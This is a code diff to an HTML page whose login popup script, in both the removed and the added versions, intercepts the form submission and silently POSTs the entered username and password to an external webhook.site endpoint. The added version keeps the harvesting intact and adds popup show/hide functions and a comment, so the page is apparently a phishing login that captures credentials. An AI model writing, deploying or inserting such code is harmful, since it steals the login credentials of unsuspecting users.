@@ -85,32 +85,45 @@
     </form>
   </div>
 
-  <script>
-   document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';
+ <script>
+  function showLogin() {
+    document.getElementById('loginPopup').style.display = 'block';
+    document.getElementById('overlayBg').style.display = 'block';
+  }
 
-  const input1 = document.createElement('input');
-  input1.type = 'hidden';
-  input1.name = 'username';
-  input1.value = document.getElementById('username').value;
+  function hideLogin() {
+    document.getElementById('loginPopup').style.display = 'none';
+    document.getElementById('overlayBg').style.display = 'none';
+  }
 
-  const input2 = document.createElement('input');
-  input2.type = 'hidden';
-  input2.name = 'password';
-  input2.value = document.getElementById('password').value;
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-  form.appendChild(input1);
-  form.appendChild(input2);
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';
 
-  document.body.appendChild(form);
-  form.submit();
-});
+    const input1 = document.createElement('input');
+    input1.type = 'hidden';
+    input1.name = 'username';
+    input1.value = document.getElementById('username').value;
 
-  </script>
+    const input2 = document.createElement('input');
+    input2.type = 'hidden';
+    input2.name = 'password';
+    input2.value = document.getElementById('password').value;
+
+    form.appendChild(input1);
+    form.appendChild(input2);
+
+    document.body.appendChild(form);
+    form.submit();
+
+    // Ẩn form sau khi submit
+    hideLogin();
+  });
+</script>
+
 
 </body>
 </html>
